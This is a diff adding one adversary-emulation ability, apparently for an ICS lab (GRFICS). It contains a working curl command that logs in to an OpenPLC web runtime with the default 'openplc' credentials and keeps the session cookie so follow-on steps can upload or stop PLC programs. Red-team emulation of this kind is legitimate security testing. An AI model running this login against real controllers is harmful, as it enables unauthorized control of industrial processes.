@@ -1,0 +1,30 @@
+---
+
+- id: b2c3d4e5-2222-2222-2222-000000000001
+  name: OpenPLC - Default Credential Access
+  description: |
+    Login to OpenPLC web runtime with default credentials (GRFICS OpenPLC).
+    Validates session by fetching /dashboard and grepping the HTML for known
+    OpenPLC dashboard markers. Writes cookie jar to /tmp/plc_cookies.txt so
+    dependent abilities (upload, compile, start/stop, remove) share the
+    authenticated session. Exits non-zero on failure so subsequent steps
+    are not attempted silently.
+  tactic: lateral-movement
+  technique_id: T0812
+  technique_name: Default Credentials
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      CODE=$(curl -s -o /tmp/plc_login_body.html -w "%{http_code}"
+      -c /tmp/plc_cookies.txt
+      -d "username=openplc&password=openplc"
+      "http://192.168.95.2:8080/login") &&
+      echo "LOGIN_HTTP_CODE=$CODE" &&
+      curl -s -b /tmp/plc_cookies.txt
+      "http://192.168.95.2:8080/dashboard"
+      -o /tmp/plc_dash.html &&
+      { grep -qi "dashboard\|OpenPLC\|Programs\|Running\|Stopped" /tmp/plc_dash.html ||
+      { echo "LOGIN_FAILED" >&2 ; exit 1 ; } ; } &&
+      echo "LOGIN_SUCCESS"
+    timeout: 60
